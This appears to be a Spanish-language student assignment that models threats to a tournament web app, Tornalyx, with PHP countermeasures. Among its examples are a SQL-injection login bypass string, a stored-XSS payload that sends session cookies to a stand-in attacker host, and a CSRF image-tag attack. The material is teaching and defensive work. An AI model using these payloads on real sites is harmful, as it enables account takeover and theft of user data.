# TAREA 7 – CIBERSEGURIDAD
## Amenazas Específicas al Sistema Tornalyx

---

## 1. Introducción

Tornalyx es una aplicación web pública con autenticación, gestión de datos de usuarios y funcionalidades administrativas. Por su naturaleza, está expuesta a un conjunto específico de amenazas de ciberseguridad que deben ser identificadas, comprendidas y mitigadas antes del despliegue en producción.

---

## 2. SQL Injection (Inyección SQL)

### Descripción
El atacante inserta código SQL malicioso en campos de entrada (formularios, URLs, parámetros) que es ejecutado por la base de datos, permitiéndole leer, modificar o eliminar datos sin autorización.

### Escenario específico en Tornalyx
Un usuario malintencionado ingresa en el campo de login:
```
Email:    admin@tornalyx.uy' OR '1'='1' --
Password: cualquiercosa
```
Si el sistema construye la query sin protección:
```sql
-- Query VULNERABLE (no hacer esto):
SELECT * FROM usuarios WHERE email = 'admin@tornalyx.uy' OR '1'='1' --' AND password = '...'
```
La condición `'1'='1'` siempre es verdadera, por lo que el atacante obtiene acceso como administrador sin conocer la contraseña.

### Vectores de ataque en Tornalyx
- Formulario de login (email y contraseña).
- Buscador de torneos (parámetro `?buscar=`).
- Parámetro de detalle de torneo (`?id=`).
- Formularios de registro de resultados.

### Impacto potencial
- **Crítico:** Acceso total a la base de datos.
- Extracción de contraseñas, emails y datos personales de todos los usuarios.
- Modificación de resultados de torneos.
- Eliminación completa de la base de datos (`DROP TABLE`).

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Usar PDO con sentencias preparadas (Prepared Statements)
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE email = ? AND password_hash = ?");
$stmt->execute([$email, $password_hash]);

// ✅ Nunca concatenar variables directamente en queries SQL
// ❌ INCORRECTO: $query = "SELECT * FROM usuarios WHERE email = '$email'";
```
- Validar y sanitizar todas las entradas antes de procesarlas.
- Usar el mínimo privilegio en el usuario de base de datos (no `root`).
- Activar el WAF (Web Application Firewall).

---

## 3. Cross-Site Scripting (XSS)

### Descripción
El atacante inyecta código JavaScript malicioso en el contenido del sitio que es luego ejecutado en el navegador de otros usuarios.

### Tipos de XSS relevantes para Tornalyx

#### XSS Almacenado (Stored XSS) — el más peligroso
El atacante crea un torneo con el siguiente nombre:
```html
<script>document.location='https://atacante.com/steal?c='+document.cookie</script>
```
Si el sistema no escapa el HTML al mostrar el nombre del torneo, este script se ejecuta en el navegador de todos los usuarios que visiten la página, robando sus cookies de sesión.

#### XSS Reflejado (Reflected XSS)
El atacante comparte un enlace trampa:
```
https://tornalyx.uy/torneos?buscar=<script>alert('XSS')</script>
```
Si el parámetro se muestra en la página sin escapar, el script se ejecuta.

### Impacto potencial
- Robo de cookies de sesión → secuestro de cuentas.
- Redirección a sitios de phishing.
- Captura de contraseñas ingresadas en formularios.
- Modificación del contenido visual del sitio (defacement).

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Escapar toda salida de datos con htmlspecialchars()
echo htmlspecialchars($nombre_torneo, ENT_QUOTES, 'UTF-8');

// ✅ Cabecera Content-Security-Policy para bloquear scripts externos
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// ✅ Cabecera X-XSS-Protection (navegadores legacy)
header("X-XSS-Protection: 1; mode=block");
```
- Validar que los campos de texto no contengan etiquetas HTML.
- Usar la librería `HTMLPurifier` si se acepta HTML enriquecido.

---

## 4. Cross-Site Request Forgery (CSRF)

### Descripción
El atacante engaña a un usuario autenticado para que ejecute acciones no deseadas en el sistema, aprovechando que su sesión está activa.

### Escenario específico en Tornalyx
El atacante prepara una página maliciosa:
```html
<!-- Página del atacante: https://sitio-malicioso.com -->
<img src="https://tornalyx.uy/admin/usuarios/eliminar?id=5" width="0" height="0" />
```
Si un administrador autenticado en Tornalyx visita el sitio del atacante, su navegador cargará la imagen (que no existe) pero enviará la petición al servidor **con su cookie de sesión activa**, ejecutando la acción de eliminar un usuario sin su conocimiento.

### Impacto potencial
- Eliminación de usuarios o torneos por un administrador víctima.
- Modificación de resultados de torneos.
- Cambio de contraseñas o emails de cuentas.
- Transferencia de privilegios.

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Generar un token CSRF único por sesión y formulario
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// ✅ Incluir el token en todos los formularios
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// ✅ Verificar el token antes de procesar cualquier acción POST
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    die('CSRF token inválido');
}
```
- Usar el atributo `SameSite=Strict` en las cookies de sesión.

---

## 5. Ataque de Fuerza Bruta

### Descripción
El atacante intenta todas las combinaciones posibles de contraseñas (o usa diccionarios de contraseñas comunes) de forma automatizada hasta encontrar la correcta.

### Escenario específico en Tornalyx
Un bot realiza miles de intentos de login en el formulario de autenticación:
```
POST /login
email: admin@tornalyx.uy
password: password123
→ FALLO

POST /login
email: admin@tornalyx.uy
password: tornalyx2026
→ FALLO

... (miles de intentos por minuto)

POST /login
email: admin@tornalyx.uy
password: Admin@2026!
→ ÉXITO (contraseña encontrada)
```

### Impacto potencial
- Acceso no autorizado a cuentas de usuarios o administradores.
- Compromiso total del sistema si la cuenta atacada es de administrador.
- Degradación del rendimiento del servidor durante el ataque.

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Límite de intentos fallidos (rate limiting)
$intentos = $_SESSION['login_intentos'] ?? 0;
if ($intentos >= 5) {
    // Bloqueo temporal de 15 minutos
    $bloqueo_hasta = $_SESSION['bloqueo_hasta'] ?? 0;
    if (time() < $bloqueo_hasta) {
        die('Cuenta bloqueada temporalmente. Intenta en 15 minutos.');
    }
}

// Al fallar: incrementar contador y establecer tiempo de bloqueo
$_SESSION['login_intentos']++;
if ($_SESSION['login_intentos'] >= 5) {
    $_SESSION['bloqueo_hasta'] = time() + 900; // 15 minutos
}
```
- Implementar CAPTCHA (Google reCAPTCHA v3) después del 3er intento.
- Notificación por email al detectar múltiples intentos fallidos.
- Registro de IPs en los intentos fallidos para análisis forense.
- Usar `password_hash()` con bcrypt (costo 12) para almacenar contraseñas.

---

## 6. Robo de Sesiones (Session Hijacking)

### Descripción
El atacante obtiene el identificador de sesión de un usuario legítimo y lo utiliza para suplantar su identidad sin necesidad de conocer la contraseña.

### Métodos de robo de sesión relevantes para Tornalyx

#### Via XSS (ya mencionado)
El script malicioso captura `document.cookie`.

#### Via sniffing en red sin HTTPS
Si la aplicación sirve HTTP en lugar de HTTPS, el session ID viaja en texto plano y puede ser interceptado en redes Wi-Fi públicas.

#### Via fijación de sesión (Session Fixation)
El atacante fuerza al usuario a usar un session ID conocido por él.

### Impacto potencial
- Acceso completo a la cuenta del usuario víctima.
- En caso de administrador: control total del sistema.
- Lectura de datos privados (equipos, estadísticas).

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Regenerar el ID de sesión al iniciar sesión (previene fixation)
session_start();
session_regenerate_id(true);  // true = elimina la sesión anterior

// ✅ Configuración segura de la cookie de sesión
ini_set('session.cookie_secure', 1);     // Solo enviar por HTTPS
ini_set('session.cookie_httponly', 1);   // JS no puede acceder a la cookie
ini_set('session.cookie_samesite', 'Strict'); // Bloquea CSRF via cookie

// ✅ Tiempo de expiración de sesión (30 minutos de inactividad)
ini_set('session.gc_maxlifetime', 1800);

// ✅ HTTPS obligatorio (en Apache .htaccess)
// RewriteEngine On
// RewriteCond %{HTTPS} off
// RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

---

## 7. Acceso Indebido (Broken Access Control)

### Descripción
Un usuario accede a recursos o funciones para los que no tiene autorización, ya sea accidentalmente o de forma malintencionada.

### Escenarios específicos en Tornalyx

#### Escalada horizontal
Un participante accede al perfil de otro participante modificando la URL:
```
/participante/perfil?id=1  → Mi perfil (permitido)
/participante/perfil?id=2  → Perfil de otro usuario (¡NO permitido!)
```

#### Escalada vertical
Un organizador accede al panel de administración:
```
/admin/dashboard  → Accede directamente aunque no es admin
```

#### Acceso directo a archivos
Un atacante accede directamente a archivos sensibles:
```
/config/database.php  → Credenciales de la base de datos expuestas
```

### Impacto potencial
- Lectura de datos privados de otros usuarios.
- Modificación de datos de otros participantes (resultados, estadísticas).
- Acceso total al sistema si se llega al panel de administración.
- Exposición de credenciales o configuraciones.

### Contramedidas aplicadas en Tornalyx
```php
// ✅ Verificar rol en CADA ruta protegida (no asumir que el usuario es legítimo)
function verificar_acceso(string $rol_requerido): void {
    session_start();
    if (!isset($_SESSION['user_id'])) {
        header('Location: /login?error=no_autenticado');
        exit;
    }
    if ($_SESSION['user_rol'] !== $rol_requerido) {
        http_response_code(403);
        header('Location: /error/403');
        exit;
    }
}

// ✅ Verificar propiedad del recurso antes de mostrarlo
$torneo = $db->query("SELECT * FROM torneos WHERE id = ? AND organizador_id = ?",
    [$torneo_id, $_SESSION['user_id']])->fetch();
if (!$torneo) { http_response_code(403); exit; }
```
- Colocar archivos de configuración **fuera del directorio web público**.
- Configurar Apache para denegar acceso a directorios sensibles con `.htaccess`.
- Implementar logging de todos los intentos de acceso no autorizados.
